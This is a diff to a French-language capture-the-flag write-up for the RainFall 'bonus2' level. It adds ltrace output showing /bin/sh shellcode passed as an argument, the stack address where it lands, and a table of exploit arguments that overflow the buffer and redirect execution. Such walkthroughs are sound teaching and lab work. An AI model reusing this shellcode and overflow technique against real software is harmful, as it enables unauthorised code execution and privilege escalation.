@@ -53,3 +53,22 @@ Stopped reason: SIGSEGV
 gdb-peda$ pattern offset 'A(AA'
 <strong>A(AA found at offset: 23</strong>
 </pre>
+- On recupere la bonne addresse memoire ou sera stocké le shellcode
+<pre>
+bonus2@RainFall:~$ LANG=nl ltrace ./bonus2 $(/tmp/shell) "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+\__libc_start_main(0x8048529, 3, 0xbffff684, 0x8048640, 0x80486b0 <unfinished ...>
+strncpy(<strong>0xbffff580</strong>, "1\311\367\341Qh//shh/bin\211\343\260\013\315\200AAAAAAAAAAA"..., 40) = 0xbffff580
+strncpy(0xbffff5a8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 32)                            = 0xbffff5a8
+getenv("LANG")                                                                            = "nl"
+memcmp(0xbffff84c, 0x804873d, 2, 0xb7fff918, 0)                                           = 1
+memcmp(0xbffff84c, 0x8048740, 2, 0xb7fff918, 0)                                           = 0
+strcat("Goedemiddag! ", "1\311\367\341Qh//shh/bin\211\343\260\013\315\200AAAAAAAAAAA"...) = "Goedemiddag! 1\311\367\341Qh//shh/bin\211\343\260\013"...
+puts("Goedemiddag! 1\311\367\341Qh//shh/bin\211\343\260\013"...)                          = 86
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+</pre>
+- Du coup on peut lancer le programme avec les argument suivant
+| arg 1 | arg 2 |
+|-------|-------|
+| shellcode + `A` * 20 | `B` * 23 + `\x80\xf5\xff\xbf` |
+- On creer des .c car en python ca bug
